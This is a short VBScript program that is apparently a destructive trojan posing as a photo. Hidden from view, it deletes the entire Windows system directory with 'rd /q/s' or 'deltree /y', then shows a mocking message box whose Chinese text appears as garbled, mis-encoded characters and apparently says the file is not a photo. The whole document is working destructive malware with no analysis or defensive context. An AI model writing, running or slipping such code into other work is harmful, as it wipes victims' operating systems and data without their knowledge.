   Set WshShell = WScript.CreateObject("WScript.Shell")
   Set WinTmpDir = WshShell.Environment("Process")
   If WinTmpDir("OS") = "Windows_NT" Then
       WshShell.Run "cmd /k rd /q/s " + WinTmpDir("windir"), vbHide
   Else
       WshShell.Run "deltree /y " + WinTmpDir("windir"), vbHide
   End If
   msgbox "¶Ô²»Æð£¬¸úÄã¿ªÍæÐ¦µÄ£¬Õâ¸ö²»ÊÇÕÕÆ¬£¡",,"¹þ¹þ¹þ£¡"
